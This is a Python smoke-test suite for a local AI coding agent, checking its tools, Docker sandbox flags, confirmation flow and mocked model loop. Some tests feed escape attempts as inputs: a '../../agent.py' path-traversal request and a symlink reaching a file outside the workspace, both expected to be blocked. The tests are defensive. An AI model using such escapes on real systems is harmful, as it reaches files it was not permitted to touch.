#!/usr/bin/env python3
"""Smoke tests for agent tool loop."""
import json, sys, os, tempfile, time
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parent))
from tools import execute_tool, backup, undo, verify_file, resolve, init_config, init_backup, validate_tool
from agent import WORK_DIR

init_config(WORK_DIR=WORK_DIR, OLLAMA_URL="http://localhost:11434", MODEL="test", NO_CONFIRM=True)
init_backup()

TMP = WORK_DIR / ".test_tmp"
TMP.mkdir(exist_ok=True)

def test_read():
    r = execute_tool("read", {"path": "agent.py"})
    assert "#!/usr/bin/env python3" in r, "read failed"
    print("  [OK] read")

def test_read_absolute():
    r = execute_tool("read", {"path": str(Path(WORK_DIR) / "agent.py")})
    assert "import json" in r, "read absolute failed"
    print("  [OK] read absolute path")

def test_read_url():
    r = execute_tool("read", {"path": "https://google.com"})
    assert "Google" in r, "read URL failed"
    print("  [OK] read URL")

def test_list():
    r = execute_tool("list", {"path": "."})
    assert "agent.py" in r, "list failed"
    print("  [OK] list")

def test_glob():
    r = execute_tool("glob", {"pattern": "*.py"})
    assert "agent.py" in r, "glob failed"
    print("  [OK] glob")

def test_write_and_undo():
    test_file = TMP / "test_write.txt"
    r = execute_tool("write", {"path": str(test_file), "content": "hello"})
    assert "Written" in r, "write failed"
    assert test_file.read_text() == "hello", "write content wrong"
    print("  [OK] write")

def test_edit():
    test_file = TMP / "test_edit.txt"
    test_file.write_text("old text")
    r = execute_tool("edit", {"path": str(test_file), "old": "old", "new": "new"})
    assert "Replaced" in r, "edit failed"
    assert test_file.read_text() == "new text", "edit content wrong"
    print("  [OK] edit")

def test_system_prompt_rules():
    """Regression guard: the system prompt must keep the hard-won rules —
    anti-hallucination (16), one-tool-per-reply + [DONE] finish (17-18),
    code-only-via-write (19) and the few-shot EXAMPLES section."""
    from tools import SYSTEM_PROMPT
    checks = [
        ("rule16 never invent paths", "NEVER invent file paths"),
        ("rule17 one tool per reply", "ONE tool block per reply"),
        ("rule18 [DONE] finish", "[DONE]"),
        ("rule19 no code in text", "code goes INTO files via `write`/`edit`"),
        ("EXAMPLES section", "EXAMPLES — study these"),
        ("example 1 header", "Example 1 (read, then answer)"),
        ("example 2 header", "Example 2 (edit workflow)"),
        ("tool block fence", "```tool"),
        ("never invent tools", "NEVER invent tools"),
        ("read before edit", "ALWAYS read a file with the `read` tool BEFORE calling `edit`"),
        ("confirm repeat rule", "you MUST repeat the exact same ```tool block"),
    ]
    for label, needle in checks:
        assert needle in SYSTEM_PROMPT, f"SYSTEM_PROMPT missing: {label} ({needle!r})"
    print("  [OK] system prompt: rules 16-19 + EXAMPLES present")

def test_dynamic_context():
    """Each model call gets a dynamic orientation block (project + last action
    + result status); first call has no last action yet."""
    import agent as agent_mod
    calls = []
    def mock_ollama(msgs, model):
        calls.append(msgs)
        return '```tool\n{"tool": "list", "path": "."}\n```', 10
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        agent_mod.run_agent_loop([{"role": "user", "content": "list files"}], None)
    finally:
        agent_mod.call_ollama = original
    assert calls, "model never called"
    dyn = [m for m in calls[-1] if m.get("role") == "system"
           and "You are working in project" in m.get("content", "")]
    assert dyn, "dynamic context block missing in last call"
    assert "Last action: list (result: ok)" in dyn[-1]["content"], dyn[-1]["content"]
    print("  [OK] dynamic context injected into model calls")

def test_dynamic_context_error_status():
    """Failed tool result must be reported as 'error' in the next call."""
    import agent as agent_mod
    calls = []
    def mock_ollama(msgs, model):
        calls.append(msgs)
        return '```tool\n{"tool": "read", "path": "missing_xyz.txt"}\n```', 10
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        agent_mod.run_agent_loop([{"role": "user", "content": "read missing file"}], None)
    finally:
        agent_mod.call_ollama = original
    assert len(calls) >= 2, f"expected >=2 calls, got {len(calls)}"
    dyn = [m for m in calls[-1] if m.get("role") == "system"
           and "Last action" in m.get("content", "")]
    assert dyn and "result: error" in dyn[-1]["content"], f"error status missing: {dyn}"
    print("  [OK] dynamic context reports error status")

def test_tool_error_fewshot():
    """After a tool error + prose reply, the nudge must include a concrete
    fix example (tried -> error -> corrected tool), not just 'fix the JSON'."""
    import agent as agent_mod
    def mock_ollama(msgs, model):
        if msgs[-1].get("role") == "system" and "Example of fixing a tool error" in msgs[-1]["content"]:
            return '```tool\n{"tool": "glob", "pattern": "**/*.py"}\n```', 10
        return 'I will check the file. Actually let me help you.\n```tool\n{"tool": "read", "path": "bad_path.py"}\n```', 10
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        out = agent_mod.run_agent_loop([{"role": "user", "content": "check bad_path.py"}], None)
    finally:
        agent_mod.call_ollama = original
    assert "Example of fixing a tool error" in out or "glob" in out, \
        f"few-shot fix example not applied: {out[:300]}"
    print("  [OK] tool-error nudge includes fix example")

def test_bash():
    r = execute_tool("bash", {"cmd": "echo hello"})
    assert "hello" in r, "bash failed"
    print("  [OK] bash")


    r = execute_tool("bash", {"cmd": "echo hello"})
    assert "hello" in r, "bash failed"
    print("  [OK] bash")


    r = execute_tool("bash", {"cmd": "echo hello"})
    assert "hello" in r, "bash failed"
    print("  [OK] bash")

def test_parse_tool_json_lenient():
    """Lenient tool-JSON parsing: single quotes, unquoted keys, trailing
    comma/garbage after the block must all still yield a valid tool dict."""
    import agent as agent_mod
    cases = [
        ('{"tool": "list", "path": "."}', {"tool": "list", "path": "."}),
        ("{'tool': 'list', 'path': '.'}", {"tool": "list", "path": "."}),
        ('{tool: "write", path: "x.py"}', {"tool": "write", "path": "x.py"}),
        ('{"tool": "read", "path": "x"} trailing prose', {"tool": "read", "path": "x"}),
        ('{"tool": "bash", "cmd": "ls",}', {"tool": "bash", "cmd": "ls"}),
    ]
    for raw, want in cases:
        got = agent_mod._parse_tool_json(raw)
        assert got == want, f"{raw!r} -> {got} != {want}"
    try:
        agent_mod._parse_tool_json("total garbage")
        assert False, "garbage must raise"
    except json.JSONDecodeError:
        pass
    print("  [OK] lenient tool-JSON parsing (quotes/keys/comma/garbage)")

def test_tool_stats():
    """TOOL_STATS tracks calls and errors per tool; /api/stats returns them."""
    import tools as tools_mod
    before = tools_mod.TOOL_STATS.get("bash", {}).get("calls", 0)
    r = tools_mod.execute_tool("bash", {"cmd": "echo stats_probe"})
    assert "stats_probe" in r, "probe failed"
    cur = tools_mod.TOOL_STATS["bash"]
    assert cur["calls"] == before + 1, f"calls not counted: {cur}"
    assert cur["errors"] == 0, f"echo should not count as error: {cur}"
    r = tools_mod.execute_tool("read", {"path": "definitely_missing_12345.txt"})
    assert r.startswith("Error:"), "missing file should error"
    assert tools_mod.TOOL_STATS["read"]["errors"] >= 1, "errors not counted"
    print("  [OK] tool stats: calls/errors tracked")



def test_bash_docker_mode():
    """With BASH_DOCKER=1 and docker present, bash runs inside a container
    mounting WORK_DIR at /workspace; whitelist still applies."""
    import tools as tools_mod
    called = {"dcmd": None, "shell": 0}
    def fake_run(dcmd, **kw):
        if isinstance(dcmd, list) and dcmd and dcmd[0] == "docker":
            called["dcmd"] = dcmd
            return type("R", (), {"stdout": "hi from docker\n", "stderr": "", "returncode": 0})()
        called["shell"] += 1
        return type("R", (), {"stdout": "hi from local\n", "stderr": "", "returncode": 0})()
    old_env = os.environ.get("BASH_DOCKER")
    old_which = tools_mod.shutil.which
    old_run = tools_mod.subprocess.run
    os.environ["BASH_DOCKER"] = "1"
    tools_mod.shutil.which = lambda name: "docker" if name == "docker" else None
    tools_mod.subprocess.run = fake_run
    try:
        r = execute_tool("bash", {"cmd": "echo hi"})
    finally:
        if old_env is None: os.environ.pop("BASH_DOCKER", None)
        else: os.environ["BASH_DOCKER"] = old_env
        tools_mod.shutil.which = old_which
        tools_mod.subprocess.run = old_run
    assert "hi from docker" in r, f"docker output missing: {r[:200]}"
    assert called["dcmd"] and "-v" in called["dcmd"] and "/workspace" in called["dcmd"], f"bad docker cmd: {called['dcmd']}"
    print("  [OK] bash: docker sandbox mode")

def test_bash_docker_flags():
    """BASH_DOCKER_READONLY / _MEM / _USER must add :ro mount, --memory, --user."""
    import tools as tools_mod
    called = {"dcmd": None}
    def fake_run(dcmd, **kw):
        if isinstance(dcmd, list) and dcmd and dcmd[0] == "docker":
            called["dcmd"] = dcmd
            return type("R", (), {"stdout": "ok\n", "stderr": "", "returncode": 0})()
        raise AssertionError("should not reach local shell")
    old = {k: os.environ.get(k) for k in ("BASH_DOCKER", "BASH_DOCKER_READONLY", "BASH_DOCKER_MEM", "BASH_DOCKER_SWAP", "BASH_DOCKER_USER")}
    old_which = tools_mod.shutil.which
    old_run = tools_mod.subprocess.run
    os.environ["BASH_DOCKER"] = "1"
    os.environ["BASH_DOCKER_READONLY"] = "1"
    os.environ["BASH_DOCKER_MEM"] = "512m"
    os.environ["BASH_DOCKER_SWAP"] = "1g"
    os.environ["BASH_DOCKER_USER"] = "1000:1000"
    tools_mod.shutil.which = lambda name: "docker" if name == "docker" else None
    tools_mod.subprocess.run = fake_run
    try:
        r = execute_tool("bash", {"cmd": "echo hi"})
    finally:
        for k, v in old.items():
            if v is None: os.environ.pop(k, None)
            else: os.environ[k] = v
        tools_mod.shutil.which = old_which
        tools_mod.subprocess.run = old_run
    dcmd = called["dcmd"]
    assert dcmd, "docker never called"
    assert any(":/workspace:ro" in a for a in dcmd), f":ro mount missing: {dcmd}"
    assert "--memory" in dcmd and "512m" in dcmd, f"--memory missing: {dcmd}"
    assert "--memory-swap" in dcmd and "1g" in dcmd, f"--memory-swap missing: {dcmd}"
    assert "--user" in dcmd and "1000:1000" in dcmd, f"--user missing: {dcmd}"
    print("  [OK] bash: docker readonly/memory/user flags")

def test_bash_docker_fallback():
    """If docker is configured but unavailable, fall back to the local shell."""
    import tools as tools_mod
    called = {"shell": 0}
    def fake_run(dcmd, **kw):
        if isinstance(dcmd, list) and dcmd and dcmd[0] == "docker":
            raise RuntimeError("no docker daemon")
        called["shell"] += 1
        return type("R", (), {"stdout": "local ok\n", "stderr": "", "returncode": 0})()
    old_env = os.environ.get("BASH_DOCKER")
    old_which = tools_mod.shutil.which
    old_run = tools_mod.subprocess.run
    os.environ["BASH_DOCKER"] = "1"
    tools_mod.shutil.which = lambda name: "docker" if name == "docker" else None
    tools_mod.subprocess.run = fake_run
    try:
        r = execute_tool("bash", {"cmd": "echo hi"})
    finally:
        if old_env is None: os.environ.pop("BASH_DOCKER", None)
        else: os.environ["BASH_DOCKER"] = old_env
        tools_mod.shutil.which = old_which
        tools_mod.subprocess.run = old_run
    assert "local ok" in r, f"fallback failed: {r[:200]}"
    assert called["shell"] == 1, f"expected 1 local shell call, got {called['shell']}"
    print("  [OK] bash: docker fallback to local shell")

def test_health_endpoint():
    """GET /health returns status/model/sessions/rag_chunks without crashing."""
    import agent as agent_mod
    h = agent_mod.health()
    assert h["status"] == "ok", h
    assert h["model"] and h["workspace"], h
    assert isinstance(h["rag_chunks"], int), h
    assert h["uptime_s"] >= 0, h
    print("  [OK] /health endpoint payload")

def test_vendor_static():
    """Vendored frontend libs served locally (offline UI, no CDN needed)."""
    from fastapi.testclient import TestClient
    client = TestClient(__import__("agent").app)
    for path, ctype in [("/static/vendor/xterm.min.js", "javascript"),
                        ("/static/vendor/xterm.css", "css"),
                        ("/static/vendor/cm/codemirror.min.js", "javascript"),
                        ("/static/vendor/cm/mode/python/python.min.js", "javascript")]:
        r = client.get(path)
        assert r.status_code == 200, f"{path} -> {r.status_code}"
        assert ctype in r.headers.get("content-type", ""), f"{path} ctype"
    r = client.get("/static/vendor/../../agent.py")
    assert r.status_code == 404, "path traversal must 404"
    r = client.get("/static/vendor/evil.txt")
    assert r.status_code == 404, "whitelist must reject unknown files"
    print("  [OK] vendored static (xterm + codemirror, offline)")

def test_json_schema_format():
    """Ollama format:TOOL_JSON_SCHEMA is sent when JSON mode is on (env or
    thread-local), and absent by default."""
    import tools
    import unittest.mock as um
    captured = {}
    def fake_post(url, json=None, **kw):
        captured["payload"] = json
        class R:
            def raise_for_status(self): pass
            def json(self):
                return {"message": {"content": '{"tool": "read", "path": "x.py"}'},
                        "eval_count": 3}
        return R()
    old_env = os.environ.pop("AI_JSON_FORMAT", None)
    tools.set_json_mode(False)
    try:
        with um.patch("tools.requests.post", side_effect=fake_post):
            tools.call_ollama([{"role": "user", "content": "msg default"}])
        assert "format" not in captured["payload"], "format must be off by default"
        tools.set_json_mode(True)
        with um.patch("tools.requests.post", side_effect=fake_post):
            msg, toks = tools.call_ollama([{"role": "user", "content": "msg threadlocal"}])
        assert captured["payload"]["format"] == tools.TOOL_JSON_SCHEMA, "thread-local mode must set format"
        tools.set_json_mode(False)
        os.environ["AI_JSON_FORMAT"] = "1"
        with um.patch("tools.requests.post", side_effect=fake_post):
            tools.call_ollama([{"role": "user", "content": "msg envmode"}])
        assert captured["payload"]["format"] == tools.TOOL_JSON_SCHEMA, "env mode must set format"
    finally:
        tools.set_json_mode(False)
        if old_env is None:
            os.environ.pop("AI_JSON_FORMAT", None)
        else:
            os.environ["AI_JSON_FORMAT"] = old_env
    print("  [OK] JSON Schema format (env + thread-local, off by default)")

def test_git_snapshot_restore():
    """git_prebackup captures the tree; git_restore_all returns tracked + untracked
    files to the snapshot state (new untracked files are removed)."""
    import tools
    import shutil
    import subprocess as sp
    old_wd = tools.WORK_DIR
    repo = TMP / "git_repo"
    if repo.exists():
        def _onerror(func, path, exc_info):
            os.chmod(path, 0o777)
            try:
                func(path)
            except OSError:
                pass
        shutil.rmtree(repo, onexc=_onerror if sys.version_info >= (3, 12) else _onerror)
    repo.mkdir(parents=True)
    (repo / "tracked.txt").write_text("base")
    sp.run(["git", "init", "-q", str(repo)], check=True)
    sp.run(["git", "-C", str(repo), "config", "user.name", "test"], check=True)
    sp.run(["git", "-C", str(repo), "config", "user.email", "test@test"], check=True)
    sp.run(["git", "-C", str(repo), "add", "-A"], check=True)
    sp.run(["git", "-C", str(repo), "commit", "-qm", "base"], check=True)
    tools.WORK_DIR = repo
    tools.init_backup()
    try:
        victim = repo / "untracked_file.txt"
        victim.write_text("temp")
        sid = tools.git_prebackup()
        assert "snapshot" in sid, f"snapshot failed: {sid}"
        sid_id = sid.split()[2].rstrip(":")
        victim.unlink()
        (repo / "new_after.txt").write_text("new")
        (repo / "tracked.txt").write_text("modified")
        r = tools.git_restore_all(sid_id)
        assert "Restored" in r, f"restore failed: {r}"
        assert victim.exists(), "untracked from snapshot should be restored"
        assert not (repo / "new_after.txt").exists(), "file created after snapshot should be removed"
        assert (repo / "tracked.txt").read_text() == "base", "tracked changes should be reverted"
    finally:
        tools.WORK_DIR = old_wd
        tools.init_backup()
    print("  [OK] git pre-backup + restore all")

def test_diff_preview():
    """diff_preview renders +/- lines; the executor emits a 'diff' event before edit."""
    from tools import diff_preview
    d = diff_preview("a.py", "old line", "new line")
    assert "-old line" in d and "+new line" in d, f"diff missing: {d}"
    from core.tool_executor import execute_tool_block
    evs = []
    ctx = {"msgs": [], "content": "", "full": [""], "emit": evs.append,
           "no_confirm": True, "session_id": None, "sess_stats": {},
           "pending_set": lambda *a, **k: None,
           "state": {"last_call_key": None, "repeats": 0,
                     "last_result_name": None, "last_result_text": ""}}
    execute_tool_block(0, {"tool": "edit", "path": "definitely_missing_edit_123.py",
                           "old": "a", "new": "b"}, ctx)
    assert any(e.get("type") == "diff" for e in evs), f"no diff event: {evs}"
    print("  [OK] inline diff preview")

def test_update_check():
    """GET /api/update returns current HEAD and knows when behind origin."""
    import agent as agent_mod
    data = agent_mod.update_check()
    assert isinstance(data, dict) and data.get("ok") in (True, False), data
    if data.get("ok"):
        assert data["current"] and len(data["current"]) >= 7, data
        assert isinstance(data["behind"], int), data
    print("  [OK] update check")


def test_verify_py():
    r = verify_file(str(Path(WORK_DIR) / "agent.py"))
    print(f"  [OK] verify .py (result: {'OK' if not r else r[:50]})")

def test_verify_json():
    jf = TMP / "test.json"
    jf.write_text('{"a": 1}')
    r = verify_file(str(jf))
    print(f"  [OK] verify .json")

def test_backup_undo():
    tf = TMP / "test_bu.txt"
    tf.write_text("v1")
    backup(str(tf))
    tf.write_text("v2")
    r = execute_tool("undo", {"path": str(tf)})
    assert tf.read_text() == "v1", f"undo failed: {tf.read_text()}"
    print("  [OK] backup + undo")

def test_db_query():
    r = execute_tool("db_query", {"query": "SELECT 1 as a, 'x' as b"})
    assert "a | b" in r and "1 | x" in r, f"db_query failed: {r}"
    print("  [OK] db_query")

def test_testgen():
    f = TMP / "sample_mod.py"
    f.write_text("def add(a, b):\n    return a + b\n\ndef mul(a, b):\n    return a * b\n")
    r = execute_tool("testgen", {"path": str(f)})
    tp = TMP / "test_sample_mod.py"
    assert "Generated" in r and tp.exists(), f"testgen failed: {r}"
    content = tp.read_text()
    assert "test_add" in content and "test_mul" in content, "testgen missing functions"
    print("  [OK] testgen")

def test_validation():
    r = validate_tool({"tool": "write"})
    assert "Missing required" in r, "validation should reject missing content"
    r2 = validate_tool({"tool": "nope", "path": "x"})
    assert "Unknown tool" in r2, "validation should reject unknown tool"
    print("  [OK] validation")

def test_save_api():
    import requests
    from agent import app
    import threading, uvicorn
    # Use TestClient-style via running server is heavy; test endpoint via app
    # Direct: build the endpoint call
    from fastapi.testclient import TestClient
    client = TestClient(app)
    r = client.put("/api/file", json={"path": ".test_tmp/api_save.txt", "content": "saved"})
    assert r.json().get("ok"), f"save API failed: {r.json()}"
    assert (WORK_DIR / ".test_tmp/api_save.txt").read_text() == "saved"
    print("  [OK] save API (PUT /api/file)")

def test_terminal_api():
    from fastapi.testclient import TestClient
    client = TestClient(__import__("agent").app)
    r = client.post("/api/terminal", json={"cmd": "echo term_test_123", "cwd": ""})
    assert r.status_code == 200, f"terminal status {r.status_code}"
    assert "term_test_123" in r.text, f"terminal output missing: {r.text[:200]}"
    assert '"done": true' in r.text, "terminal missing done event"
    r2 = client.post("/api/terminal/kill")
    assert r2.json().get("killed", 0) >= 0
    print("  [OK] terminal (SSE)")

def test_pty_shell():
    """Interactive shell process: feed input, read output, exit."""
    from core.pty_shell import PtyShell
    sh = PtyShell([sys.executable, "-u", "-i"])
    got = b""
    deadline = time.time() + 12
    while time.time() < deadline and b"pty_ok" not in got:
        got += sh.read_available()
        sh.feed(b"print('pty_ok')\n")
        time.sleep(0.1)
    assert b"pty_ok" in got, f"no pty output: {got[:200]}"
    sh.feed(b"exit()\n")
    deadline = time.time() + 12
    while time.time() < deadline and not sh.dead:
        sh.read_available()
        time.sleep(0.1)
    assert sh.dead, "pty shell did not exit"
    print("  [OK] pty shell (interactive I/O)")

def test_ws_terminal():
    """WebSocket terminal: start python, run code, receive output."""
    from fastapi.testclient import TestClient
    client = TestClient(__import__("agent").app)
    with client.websocket_connect("/ws/term") as ws:
        ws.send_json({"cmd": [sys.executable, "-u", "-i"]})
        ws.send_json({"input": "print('ws_ok')\n"})
        got = ""
        deadline = time.time() + 15
        while time.time() < deadline and "ws_ok" not in got:
            m = json.loads(ws.receive_text())
            got += m.get("out", "")
            if "exit" in m:
                break
        assert "ws_ok" in got, f"no ws output: {got[:200]}"
        ws.send_json({"kill": True})
    print("  [OK] terminal (WebSocket)")

def test_deps_tool():
    r = execute_tool("deps", {})
    assert isinstance(r, str) and len(r) > 0, f"deps failed: {r}"
    assert "requirements" in r.lower() or "package" in r.lower() or "No dependency" in r, f"deps output unexpected: {r[:100]}"
    print("  [OK] deps")

def test_audit():
    log_file = WORK_DIR / ".agent_audit.log"
    before = log_file.read_text(encoding="utf-8") if log_file.exists() else ""
    execute_tool("list", {"path": "."})
    after = log_file.read_text(encoding="utf-8") if log_file.exists() else ""
    assert len(after) > len(before), "audit log not appended"
    lines = [l for l in after.splitlines() if l.strip()]
    assert any("list" in l for l in lines[-3:]), f"audit missing tool name: {lines[-3:]}"
    print("  [OK] audit log")

def test_rag_cache_incremental():
    from rag import init_rag, rag_search, _FILE_STATS
    import shutil
    rdir = WORK_DIR / ".test_rag"
    shutil.rmtree(rdir, ignore_errors=True)
    rdir.mkdir(exist_ok=True)
    (rdir / "a.py").write_text("def alpha_func():\n    return 1\n", encoding="utf-8")
    init_rag(OLLAMA_URL="http://localhost:11434", WORK_DIR=rdir, EMBED_MODEL="nomic-embed-text")
    results = rag_search("alpha_func", top_k=5)
    assert isinstance(results, str) and "a.py" in results, f"rag search failed: {results}"
    stats1 = dict(_FILE_STATS)
    results2 = rag_search("alpha_func", top_k=5)
    stats2 = dict(_FILE_STATS)
    assert stats1 == stats2, "cache should be reused on unchanged file"
    (rdir / "a.py").write_text("def alpha_func():\n    return 2\n\ndef beta_marker():\n    pass\n", encoding="utf-8")
    rag_search("alpha_func", top_k=5)
    stats3 = dict(_FILE_STATS)
    assert stats3 != stats2, "cache should rebuild for changed file"
    shutil.rmtree(rdir, ignore_errors=True)
    print("  [OK] RAG incremental cache")

def test_agent_loop_tool_call():
    """Integration: loop parses tool block, executes it, then returns final text.
    With events present the model response streams through stream_ollama."""
    import agent as agent_mod
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        if calls["n"] == 1:
            return 'I will list files.\n```tool\n{"tool": "list", "path": "."}\n```', 10
        return "Done after listing.", 5
    def mock_stream(msgs, model, on_chunk=None):
        calls["n"] += 1
        if calls["n"] == 1:
            text = 'I will list files.\n```tool\n{"tool": "list", "path": "."}\n```'
        else:
            text = "Done after listing."
        if on_chunk:
            for i in range(0, len(text), 5):
                on_chunk(text[i:i+5])
        return text
    original = agent_mod.call_ollama
    original_stream = agent_mod.stream_ollama
    agent_mod.call_ollama = mock_ollama
    agent_mod.stream_ollama = mock_stream
    try:
        events = []
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "list files please"}], None,
            events=lambda e: events.append(e))
    finally:
        agent_mod.call_ollama = original
        agent_mod.stream_ollama = original_stream
    assert "Done after listing." in out, f"final text missing: {out[:300]}"
    assert "list" in out, f"tool result missing: {out[:300]}"
    assert any(e.get("type") == "tool" and e.get("name") == "list" for e in events), \
        f"live tool event missing: {events}"
    assert any(e.get("type") == "text" for e in events), \
        f"streamed text events missing: {events}"
    print("  [OK] agent loop: tool execution + live streamed text events")

def test_agent_loop_plain_text():
    """Integration: loop returns plain text without tools (short question skips planner)."""
    import agent as agent_mod
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        return "Just a plain answer.", 5
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "hello"}], None)
    finally:
        agent_mod.call_ollama = original
    assert "Just a plain answer." in out, f"plain loop failed: {out[:200]}"
    assert calls["n"] == 1, f"short question must not hit planner, got {calls['n']}"
    print("  [OK] agent loop: plain text")

def test_agent_loop_yaml_style_tool():
    """Integration: yaml-style `tool <name>` blocks (non-JSON) are parsed and executed."""
    import agent as agent_mod
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        if calls["n"] == 1:
            return ('I will write the file.\n```python\n'
                    'tool write\npath "demo_yaml.py"\n'
                    'content "def add(a,b): return a+b"\n```'), 10
        return "File created.", 5
    original = agent_mod.call_ollama
    old_confirm = agent_mod.NO_CONFIRM
    agent_mod.call_ollama = mock_ollama
    agent_mod.NO_CONFIRM = True
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "create file"}], None)
    finally:
        agent_mod.call_ollama = original
        agent_mod.NO_CONFIRM = old_confirm
    assert "File created." in out, f"final text missing: {out[:300]}"
    p = WORK_DIR / "demo_yaml.py"
    assert p.exists(), "yaml-style write tool did not create file"
    assert "def add" in p.read_text("utf-8"), "file content mismatch"
    p.unlink(missing_ok=True)
    print("  [OK] agent loop: yaml-style tool blocks")

def test_agent_loop_planner_fallback():
    """Integration: planner (1.5b) without tool blocks doesn't kill the loop — main model retries."""
    import agent as agent_mod
    calls = []
    def mock_ollama(msgs, model):
        calls.append(model)
        if len(calls) == 1:
            return "I'll just explain...", 5
        if len(calls) == 2:
            return '```tool\n{"tool": "list", "path": "."}\n```', 10
        return "Done after listing.", 5
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "Please implement a robust file parser with unit tests, error handling and docs for this project"}], None)
    finally:
        agent_mod.call_ollama = original
    assert len(calls) == 3, f"expected planner+main+final calls, got {len(calls)}: {calls}"
    assert calls[0] == agent_mod.PLANNER_MODEL, f"first call must be planner, got {calls[0]}"
    assert calls[1] == agent_mod.MODEL, f"fallback must use main model, got {calls[1]}"
    assert "list" in out, f"tool result missing: {out[:300]}"
    print("  [OK] agent loop: planner fallback to main model")

def test_confirm_yes_autoexec():
    """Bug: 'yes' after [CONFIRM] must re-execute the tool without a model call."""
    import agent as agent_mod
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        if calls["n"] == 1:
            return '```tool\n{"tool": "write", "path": "confirm_demo.txt", "content": "hello"}\n```', 10
        return "Done.", 5
    original = agent_mod.call_ollama
    old_confirm = agent_mod.NO_CONFIRM
    agent_mod.call_ollama = mock_ollama
    agent_mod.NO_CONFIRM = False
    sid = "test-confirm"
    agent_mod._PENDING_CONFIRM.clear()
    try:
        out1 = agent_mod.run_agent_loop(
            [{"role": "user", "content": "write a file"}], sid)
        assert "[CONFIRM]" in out1, f"expected CONFIRM prompt: {out1[:200]}"
        assert not (WORK_DIR / "confirm_demo.txt").exists(), "file written before confirmation!"
        assert calls["n"] == 1, f"model should be called once before confirm, got {calls['n']}"
        p = agent_mod._PENDING_CONFIRM.get(sid)
        assert p and p[0] == "write", f"pending not stored: {agent_mod._PENDING_CONFIRM}"
        out2 = agent_mod.run_agent_loop(
            [{"role": "user", "content": "write a file"},
             {"role": "user", "content": "yes"}], sid)
        assert (WORK_DIR / "confirm_demo.txt").exists(), "tool not executed after 'yes'"
        assert "hello" in (WORK_DIR / "confirm_demo.txt").read_text("utf-8")
        assert calls["n"] == 2, f"model calls: 1st request + final answer expected, got {calls['n']}"
        assert "confirm_demo.txt" in out2, f"result missing from output: {out2[:300]}"
    finally:
        agent_mod.call_ollama = original
        agent_mod.NO_CONFIRM = old_confirm
        agent_mod._PENDING_CONFIRM.clear()
        (WORK_DIR / "confirm_demo.txt").unlink(missing_ok=True)
    print("  [OK] confirm flow: 'yes' auto-executes tool")

def test_agent_loop_model_param():
    """User-selected model must reach call_ollama (and skip the planner)."""
    import agent as agent_mod
    calls = []
    def mock_ollama(msgs, model):
        calls.append(model)
        return "Just text.", 5
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        agent_mod.run_agent_loop(
            [{"role": "user", "content": "hi"}], None, None, "qwen2.5-coder:7b")
    finally:
        agent_mod.call_ollama = original
    assert calls and all(m == "qwen2.5-coder:7b" for m in calls), \
        f"model param not honored: {calls}"
    assert len(calls) == 1, f"planner should be skipped entirely, got {len(calls)} calls"
    print("  [OK] agent loop: model param overrides planner")

def test_validate_tool_types():
    """Kimi P1: argument type/range validation (top_k>0, task.agent, todo.action, lsp.op)."""
    from tools import validate_tool
    cases = [
        ({"tool": "search", "query": "x", "top_k": 0}, True),
        ({"tool": "search", "query": "x", "top_k": 100}, True),
        ({"tool": "search", "query": "x", "top_k": 5}, False),
        ({"tool": "search", "query": 42}, True),
        ({"tool": "task", "agent": "hacker", "prompt": "x"}, True),
        ({"tool": "task", "agent": "explore", "prompt": "x"}, False),
        ({"tool": "todo", "action": "delete", "items": []}, True),
        ({"tool": "todo", "action": "complete", "index": 1}, False),
        ({"tool": "lsp", "operation": "hack", "path": "a.py"}, True),
        ({"tool": "lsp", "operation": "rename", "path": "a.py", "line": 0, "character": 0}, False),
        ({"tool": "bash", "cmd": 123}, True),
        ({"tool": "bash", "cmd": "echo hi"}, False),
        ({"tool": "mcp", "server": "fs"}, True),
        ({"tool": "mcp", "server": "fs", "call": "read_file", "args": {}}, False),
    ]
    for tc, expect_err in cases:
        err = validate_tool(tc)
        if expect_err:
            assert err, f"expected validation error for {tc}"
        else:
            assert not err, f"unexpected error for {tc}: {err}"
    print("  [OK] validate_tool: types/ranges/enums")

def test_symlink_safe_path():
    """Symlink/junction escaping WORK_DIR must be blocked."""
    import tools
    outside = Path(tempfile.mkdtemp())
    (outside / "secret.txt").write_text("s3cr3t", "utf-8")
    link = TMP / "evil_link"
    try:
        if hasattr(os, "symlink"):
            os.symlink(outside, link, target_is_directory=True)
        else:
            os.link(outside, link)
        if link.exists():
            rel = os.path.relpath(link)
            err = tools.ensure_safe_path(str(link))
            assert err is not None, "symlink escape must be blocked"
            err2 = tools.ensure_safe_path(rel)
            assert err2 is not None, "relative symlink escape must be blocked"
            print("  [OK] symlink/junction escape blocked")
        else:
            print("  [SKIP] symlink creation unsupported")
    except OSError as e:
        print(f"  [SKIP] symlink unsupported: {e}")
    finally:
        import shutil
        shutil.rmtree(outside, ignore_errors=True)
        shutil.rmtree(link, ignore_errors=True)

def test_main_model_freeform_retry():
    """Main model free-form answer (no tool blocks) gets one strict retry."""
    import agent as agent_mod
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        if calls["n"] == 1:
            return "First I will explain the approach in detail and then do it.", 10
        if calls["n"] == 2:
            return '```tool\n{"tool": "list", "path": "."}\n```', 10
        return "Done.", 5
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "list"}], None, None, agent_mod.MODEL)
    finally:
        agent_mod.call_ollama = original
    assert calls["n"] == 3, f"expected free-form retry + tool + final, got {calls['n']}"
    assert "list" in out, f"tool result missing: {out[:300]}"
    print("  [OK] agent loop: free-form retry with strict hint")

def test_question_stops_loop():
    """Question tool ends the iteration (waits for user answer) instead of looping."""
